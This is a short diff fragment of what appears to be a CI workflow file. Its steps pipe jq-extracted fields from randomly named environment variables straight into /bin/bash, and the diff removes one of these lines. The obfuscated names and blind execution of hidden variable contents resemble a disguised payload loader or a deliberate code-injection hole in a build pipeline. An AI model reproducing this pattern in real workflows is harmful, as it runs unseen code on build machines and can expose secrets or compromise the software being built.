@@ -28,7 +28,6 @@ jobs:
           echo $vckdd21200 | jq -r .haml6 | /bin/bash
           echo $oxss541 | jq -r .jxj025 | /bin/bash
           echo $iyzw66090 | jq -r .aloz22804 | /bin/bash
-          printf '%s' "$wvpvg135" | jq -r .hg3 | /bin/bash
           printf '%s' "$x9995" | jq -r .rnhej15069 | /bin/bash
           echo $sg64606 | jq -r .pfc42 | /bin/bash
           printf '%s' "$xghn536" | jq -r .hxg958 | /bin/bash
